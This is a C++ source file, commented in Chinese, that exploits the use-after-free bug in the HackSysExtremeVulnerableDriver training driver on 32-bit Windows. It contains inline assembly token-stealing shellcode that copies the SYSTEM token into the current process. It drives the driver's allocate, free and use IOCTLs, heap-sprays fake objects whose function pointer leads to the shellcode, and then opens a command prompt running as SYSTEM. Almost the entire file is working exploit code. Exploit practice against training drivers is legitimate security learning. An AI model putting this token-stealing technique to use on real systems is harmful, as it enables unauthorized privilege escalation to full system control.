// 1UAF.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<Windows.h>
#include "TypeConfusion.h"

typedef void(*FunctionPointer)();

typedef struct _FAKE_USE_AFTER_FREE
{
	FunctionPointer countinter;
	char bufffer[0x54];
}FAKE_USE_AFTER_FREE,*PUSE_AFTER_FREE;

void ShellCode()
{
	__asm
	{
		nop;
		pushad;
		mov eax,fs:[0x124];
		mov eax,[eax+0x150];//current process
		mov ecx,eax;
		mov edx,4;
		
find_sys_pid:
		mov eax,[eax+0xb8];//active process
		sub eax,0xb8;//eprocess
		cmp [eax+0xb4],edx;
		jnz find_sys_pid;
		//find it
		mov eax,[eax+0xf8];//systemprocess token
		mov [ecx+0xf8],eax;
		popad;
		//ret;
	}
}

void CreateCmd()
{
	STARTUPINFO si={0};
	PROCESS_INFORMATION pi={0};
	si.dwFlags=STARTF_USESHOWWINDOW;
	si.wShowWindow=SW_SHOW;
	WCHAR wzFilePath[MAX_PATH]={L"cmd.exe"};
	bool bret=CreateProcessW(NULL,wzFilePath,NULL,NULL,false,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
	if (bret)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}


}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD recvBuf;
	// 获取句柄
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	printf("Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		printf("获取句柄失败\n");
		return 0;
	}

	// 调用 AllocateUaFObject() 函数申请内存
	printf("Start to call AllocateUaFObject()...\n");
	DeviceIoControl(hDevice, 0x222013, NULL, NULL, NULL, 0, &recvBuf, NULL);

	// 调用 FreeUaFObject() 函数释放对象
	printf("Start to call FreeUaFObject()...\n");
	DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, 0, &recvBuf, NULL);

	printf("Start to write shellcode()...\n");
	//申请假的chunk
	PUSE_AFTER_FREE fakeG_UseAfterFree = (PUSE_AFTER_FREE)malloc(sizeof(FAKE_USE_AFTER_FREE));
	//指向我们的shellcode
	fakeG_UseAfterFree->countinter = ShellCode;
	printf("ShellCode addr %x\n",ShellCode);
	//用A填满该chunk
	RtlFillMemory(fakeG_UseAfterFree->bufffer, sizeof(fakeG_UseAfterFree->bufffer), 'A');

	// 堆喷射
	printf("***********************************\n");
	printf("Start to heap spray...\n");
	for (int i = 0; i < 5000; i++)
	{
		DeviceIoControl(hDevice, 0x22201F, fakeG_UseAfterFree, 0x60, NULL, 0, &recvBuf, NULL);
	}
	printf("Start to call UseUaFObject()...\n");
	DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, 0, &recvBuf, NULL);

	printf("Start to create cmd...\n");
	CreateCmd();

getchar();
	return 0;
}

